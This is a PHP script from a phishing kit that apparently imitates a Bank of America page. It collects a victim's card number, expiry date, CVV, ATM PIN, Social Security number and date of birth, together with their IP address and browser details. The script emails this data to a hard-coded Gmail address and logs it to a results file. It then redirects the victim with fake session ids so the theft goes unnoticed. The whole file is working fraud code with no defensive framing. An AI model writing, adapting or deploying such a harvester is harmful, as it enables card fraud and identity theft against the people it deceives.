<?php
if($_POST["cn"] != "" and $_POST["ex"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------B0A Info-----------------------\n";
$message .= "Card Number            : ".$_POST['cn']."\n";
$message .= "Expiry Date       : ".$_POST['ex']."\n";
$message .= "CVV            : ".$_POST['vc']."\n";
$message .= "ATM PIN          : ".$_POST['pn']."\n";
$message .= "SSN          : ".$_POST['sn']."\n";
$message .= "DOB          : ".$_POST['db']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
$to = 'sayeemayee80000@gmail.com';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$fp = fopen("results.txt","a");
fputs($fp,$message);
fclose($fp);
$praga=rand();
$praga=md5($praga);
  header ("Location: surf5.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>